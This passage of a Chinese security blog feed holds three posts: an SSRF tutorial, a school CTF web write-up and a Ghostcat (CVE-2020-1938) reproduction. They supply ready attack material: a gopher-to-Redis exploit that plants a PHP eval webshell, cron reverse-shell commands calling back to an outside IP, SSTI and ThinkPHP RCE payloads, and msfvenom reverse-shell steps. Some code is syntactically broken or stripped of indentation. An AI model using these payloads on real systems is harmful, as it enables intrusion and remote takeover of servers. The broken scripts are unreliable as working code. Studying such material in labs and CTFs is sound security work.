    <content type="html"><![CDATA[<h1 id="ssrf漏洞"><a href="#ssrf漏洞" class="headerlink" title="ssrf漏洞"></a>ssrf漏洞</h1><a id="more"></a><h1 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h1><ol><li>ssrf漏洞介绍</li><li>ssrf漏洞原理</li><li>ssrf漏洞挖掘</li><li>ssrf攻击利用</li></ol><hr><h3 id="ssrf漏洞介绍"><a href="#ssrf漏洞介绍" class="headerlink" title="ssrf漏洞介绍"></a>ssrf漏洞介绍</h3><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。<br>简单来说就是利用外部能够访问到的web应用程序作为跳板对无法访问的内网进行攻击，常见的有:文件读取，端口开放发现，攻击内网开放的redis，mysql服务等</p><h3 id="ssrf漏洞原理"><a href="#ssrf漏洞原理" class="headerlink" title="ssrf漏洞原理"></a>ssrf漏洞原理</h3><p>web应用程序使用了如curl，file_get_content()等能够进行远程请求的函数，但是在对请求的url参数并没有做严格的校验和过滤，于是如果将传入的参数设置为内网的ip，就能够对web应用程序的内网资源进行探测扫描，甚至攻击内网开放的服务</p><h3 id="ssrf漏洞挖掘"><a href="#ssrf漏洞挖掘" class="headerlink" title="ssrf漏洞挖掘"></a>ssrf漏洞挖掘</h3><p>ssrf漏洞一半出现在有调用外部资源的场景中，如社交服务的分享，图片识别，网站信息采集，远程资源求情，文件处理服务，解析资源等。<br>在测试的时候可以使用如下协议进行探测<br>file:// 从文件系统获取文件内容，常用的探测poc file:///etc/passwd<br>dict:// 字典服务器协议,如开放了redis服务 dict://ip:6379/info<br>gopher:// 使用gopher协议时，能够通过控制访问的url实现向指定的服务器发送任意内容，如http请求，redis请求等等</p><h3 id="ssrf攻击利用"><a href="#ssrf攻击利用" class="headerlink" title="ssrf攻击利用"></a>ssrf攻击利用</h3><ol><li>内网资源探测<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> request</span><br><span class="line">ports = [<span class="number">22</span>,<span class="number">23</span>,<span class="number">80</span>,<span class="number">443</span>,<span class="number">3306</span>,<span class="number">4000</span>,<span class="number">6379</span>,<span class="number">8000</span>,<span class="number">8080</span>]//可以按需求添加</span><br><span class="line">session = request.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">255</span>):</span><br><span class="line">    ip = <span class="string">&#x27;192.168.2.&#123;&#125;&#x27;</span>.format(i)</span><br><span class="line">    <span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line">        url = <span class="string">&#x27;http://xxx.com?url=http://&#123;&#125;:&#123;&#125;&#x27;</span>.format(ip,port)</span><br><span class="line">        <span class="keyword">try</span> res = session.get(url,timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> len(res.content)&gt;<span class="number">0</span>:</span><br><span class="line">            print(ip,port)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">print(<span class="string">&quot;----------end------------&quot;</span>)</span><br></pre></td></tr></table></figure></li><li>gopher协议攻击内网服务<br>最常用的gopher打redis,当探测出6379端口的时候,很有可能内网开放了redis服务，而一般来说redis是可以匿名访问的，攻击redis的手段通常有在web根目录下写入shell;写入反弹shell;如果没有在redis.conf将daemonize no改为yes 和protected-mode no改为yes的话就很容易造成写入ssh公钥直接以root权限，直接以root权限控制整个服务器<br>web根目录下写入webshell<br>这里就借用一下七友师傅的exp了<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;出处https://byqiyou.github.io/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;&quot;</span><span class="comment">#设置ip</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;</span><span class="comment">#shell可根据后端语言修改</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span><span class="comment">#一般web服务都部署在这个目录下</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line"> <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.format(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line"> <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.format(path),</span><br><span class="line"> <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.format(filename),</span><br><span class="line"> <span class="string">&quot;save&quot;</span></span><br><span class="line"> ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd+=<span class="string">&quot;*&quot;</span>+str(len(redis_arr))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">cmd+=CRLF+<span class="string">&quot;$&quot;</span>+str(len((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">cmd+=CRLF</span><br><span class="line"><span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">payload += urllib.quote(redis_format(x))</span><br><span class="line"><span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure></li><li>写入cron的反弹shell<br>在虚拟机开放redis服务 ./redis-server redis.conf，并且使用socat将1234端口转发到6379端口上，监听1234端口 socat -v tcp-listen:1234,fork tcp-connect:localhost:6379<br>在攻击机上写入攻击命令<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@LAPTOP-60MTI4MA:~# redis-cli -h 受害者ip -p 1234 flushall</span><br><span class="line">root@LAPTOP-60MTI4MA:~# echo -e &quot;\n\n*/1 * * * * bash -i /dev/tcp/172.17.173.107/1234 0&gt;&amp;1\n\n&quot; | redis-cli -h 受害者ip -p 1234 -x set 1</span><br><span class="line">OK</span><br><span class="line">root@LAPTOP-60MTI4MA:~# redis-cli -h 受害者ip -p 1234  config set dir /var/spool/cron</span><br><span class="line">OK</span><br><span class="line">root@LAPTOP-60MTI4MA:~# redis-cli -h 受害者ip -p 1234  config set dbfilename root</span><br><span class="line">OK</span><br><span class="line">root@LAPTOP-60MTI4MA:~# redis-cli -h 受害者ip -p 1234  save</span><br></pre></td></tr></table></figure>监听处<br><img src="/image/ssrf1.png" alt="ssrf"><br>将其转为gopher协议格式，舍弃&gt;&lt;和+ok将”\r”替换成”%0d”,”换行”替换成”%0a”,$进行url编码得到<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="comment">#author: JoyChou</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">exp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">&#x27;&gt;&lt;+&#x27;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 判断倒数第2、3字符串是否为\r</span></span><br><span class="line">        <span class="keyword">elif</span> line[<span class="number">-3</span>:<span class="number">-1</span>] == <span class="string">r&#x27;\r&#x27;</span>:</span><br><span class="line">            <span class="comment"># 如果该行只有\r，将\r替换成%0a%0d%0a</span></span><br><span class="line">            <span class="keyword">if</span> len(line) == <span class="number">3</span>:</span><br><span class="line">                exp = exp + <span class="string">&#x27;%0a%0d%0a&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                line = line.replace(<span class="string">r&#x27;\r&#x27;</span>, <span class="string">&#x27;%0d%0a&#x27;</span>)</span><br><span class="line">                <span class="comment"># 去掉最后的换行符</span></span><br><span class="line">                line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                exp = exp + line</span><br><span class="line">        <span class="comment"># 判断是否是空行，空行替换为%0a</span></span><br><span class="line">        <span class="keyword">elif</span> line == <span class="string">&#x27;\x0a&#x27;</span>:</span><br><span class="line">            exp = exp + <span class="string">&#x27;%0a&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            exp = exp + line</span><br><span class="line"><span class="keyword">print</span> exp</span><br></pre></td></tr></table></figure>转成之后nc -lvp监听反弹端口 curl -v gopher://ip:6379/_exp获取反弹shell</li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ssrf漏洞&quot;&gt;&lt;a href=&quot;#ssrf漏洞&quot; class=&quot;headerlink&quot; title=&quot;ssrf漏洞&quot;&gt;&lt;/a&gt;ssrf漏洞&lt;/h1&gt;</summary>
    
    
    
    <category term="vuln" scheme="http://example.com/categories/vuln/"/>
    
    
  </entry>
  
  <entry>
    <title>校赛web-wp</title>
    <link href="http://example.com/2020/12/13/%E6%A0%A1%E8%B5%9Bweb-wp/"/>
    <id>http://example.com/2020/12/13/%E6%A0%A1%E8%B5%9Bweb-wp/</id>
    <published>2020-12-13T10:23:46.000Z</published>
    <updated>2020-12-13T11:32:09.518Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NEUF-CTF校赛web-wp"><a href="#NEUF-CTF校赛web-wp" class="headerlink" title="NEUF-CTF校赛web wp"></a>NEUF-CTF校赛web wp</h1><a id="more"></a><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>这次校赛是为了选拔2020届Maple_Leaves战队成员举办的面向全校的比赛，这次校赛我和大二的学弟一起作为出题人，总体来看效果还算不错下面贴张图(为保护同学隐私名称已做处理)<br><img src="/image/%E6%A0%A1%E8%B5%9B.png" alt="校赛1"></p><h3 id="web-1-ssti"><a href="#web-1-ssti" class="headerlink" title="web-1 ssti"></a>web-1 ssti</h3><p>并没有做防护的flask jinja2模板注入，在查看了网页源代码之后得知通过get可以传入name参数，因为题目本身已经说明得很清楚了就是ssti,于是先进行测试url?name=49得到49的运算结果回显<br>，之后就能够进行找类进行文件读取了，我所用的exp为</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__ 首先找到object类，之后就能使用object类了</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()继续寻找os的子类。这里举例一种。&lt;class &#x27;os._wrap_close&#x27;&gt;，os命令相信你看到就感觉很亲切。我们正是要从这个类中寻找我们可利用的方法，在本题中该类位于118位所以&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__查找到popen能够进行系统命令执行</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls&#x27;).read()测试成功，之后尝试cat /flag知道flag值</span><br></pre></td></tr></table></figure><p><img src="/image/ssti1.png" alt="ssti1"><br><img src="/image/ssti2.png" alt="ssti2"><br><img src="/image/ssti3.png" alt="ssti3"><br><img src="/image/ssti4.png" alt="ssti4"></p><h3 id="web-2-thinkphp5"><a href="#web-2-thinkphp5" class="headerlink" title="web-2 thinkphp5"></a>web-2 thinkphp5</h3><p>thinkphp5.x，并没有做防护，直接找网上就能找到很多exp<br>这个版本是5.0.26 对于5.0.x<br>将控制的url参数s的设置为captcha，并且设置post数据:_method=__construct&amp;filter=system&amp;method=get&amp;server[REQUEST_METHOD]=cat /flag解出</p><h3 id="web-3-easy-unserialize"><a href="#web-3-easy-unserialize" class="headerlink" title="web-3 easy_unserialize"></a>web-3 easy_unserialize</h3><p>直接贴源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;hint.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$txt = $_GET[<span class="string">&quot;txt&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">$password = $_GET[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($txt) &amp;&amp; ($txt === <span class="string">&quot;welcome to the nefu-nsi&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello friend!&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;It&#x27;s not time to get flag&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents($file);</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are not the number of nsi ! &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$filename</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> (<span class="string">&quot;good&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>很显然第一步?txt=welcome to the nefu-nsi接着进入else环节，显然file不让你直接读取flag.php<br>这个时候就需要用到文件包含以及php伪协议的知识了<br>txt=welcome to the nefu-nsi&amp;file=php://filter/read=convert.base64-encode/resource=hint.php,base64解密得到源码以及读取index.php得到源码，构造pop链<br>echo password的时候回触发__toString函数，所以只要将__toString()函数中的file设置成为flag.php就能够读取出flag了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$flag = <span class="keyword">new</span> Flag($file = <span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span>(serialize($flag));</span><br><span class="line">$flag = unserialize(serialize($flag));</span><br><span class="line"><span class="keyword">echo</span>($flag);</span><br></pre></td></tr></table></figure><p>之后将序列化的结果传入，之后查看源代码<br><img src="/image/uns.png" alt="unserializ"></p><p>该wp并不涉及具体原理，具体知识点对应原理还请自行浏览器查询</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;NEUF-CTF校赛web-wp&quot;&gt;&lt;a href=&quot;#NEUF-CTF校赛web-wp&quot; class=&quot;headerlink&quot; title=&quot;NEUF-CTF校赛web wp&quot;&gt;&lt;/a&gt;NEUF-CTF校赛web wp&lt;/h1&gt;</summary>
    
    
    
    <category term="writeup" scheme="http://example.com/categories/writeup/"/>
    
    
  </entry>
  
  <entry>
    <title>tomcat文件包含</title>
    <link href="http://example.com/2020/12/05/tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://example.com/2020/12/05/tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2020-12-05T06:43:05.000Z</published>
    <updated>2021-01-13T08:39:51.408Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE2020-1938幽灵猫漏洞利用复现"><a href="#CVE2020-1938幽灵猫漏洞利用复现" class="headerlink" title="CVE2020-1938幽灵猫漏洞利用复现"></a>CVE2020-1938幽灵猫漏洞利用复现</h1><a id="more"></a><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p><a href="https://www.chaitin.cn/zh/ghostcat">Ghostcat（幽灵猫）</a> 是由长亭科技安全研究员发现的存在于 Tomcat 中的安全漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如 可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。</p><p>参考链接：</p><ul><li><a href="https://www.chaitin.cn/zh/ghostcat">https://www.chaitin.cn/zh/ghostcat</a></li><li><a href="https://www.cnvd.org.cn/webinfo/show/5415">https://www.cnvd.org.cn/webinfo/show/5415</a></li><li><a href="https://mp.weixin.qq.com/s/D1hiKJpah3NhEBLwtTodsg">https://mp.weixin.qq.com/s/D1hiKJpah3NhEBLwtTodsg</a></li><li><a href="https://mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ">https://mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ</a></li></ul><hr><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>　Apache Tomcat 6</p><p>　Apache Tomcat 7 &lt; 7.0.100</p><p>　Apache Tomcat 8 &lt; 8.5.51</p><p>　Apache Tomcat 9 &lt; 9.0.31</p><h3 id="环境以及工具"><a href="#环境以及工具" class="headerlink" title="环境以及工具"></a>环境以及工具</h3><ol><li>vulhub</li><li>docker</li><li>msf</li><li>幽灵猫利用脚本</li></ol><hr><h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>进入vulhub/tomcat/CVE-2020-1938下启动docker容器<br>docker-compose up -d<br><img src="/image/docker-1.png" alt="docker-1"><br>建议将docker换源，这样拉去镜像的速度会加快很多，修改配置文件<br>“registry-mirrors”: [<br>    “<a href="https://docker.mirrors.ustc.edu.cn&quot;/">https://docker.mirrors.ustc.edu.cn&quot;</a><br>  ]<br>查看docker容器的id docker ps<br><img src="/image/docker-2.png" alt="docker-2"><br>使用msf下的msfvenom模块生成木马<br>msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.txt<br>利用上传点将shell.txt上传，如果是初始环境的话可以使用docker cp shell.txt container ID:/usr/local/tomcat/webapps/ROOT/shell.txt<br>上传成功后使用脚本进行测试<br>python2 Tomcat-ROOT路径下文件读取(CVE-2020-1938).py -f “/shell.txt” -p 8009 127.0.0.1<br><img src="/image/%E8%AF%BB%E5%8F%96.png" alt="读取"><br>成功任意文件读取<br>python2 Tomcat-ROOT路径下文件包含(CVE-2020-1938).py -f /shell.txt -p 8009 127.0.0.1<br>msf</p><blockquote><p>use exploit/mylti/handler<br>set payload java/jsp_shell_reverse_tcp<br>set lhots ip<br>set lport port<br>run<br><img src="/image/msf.png" alt="msf"></p></blockquote><hr><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p><a href="https://github.com/sv3nbeast/CVE-2020-1938-Tomact-file_include-file_read">脚本链接</a><br>文件读取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span 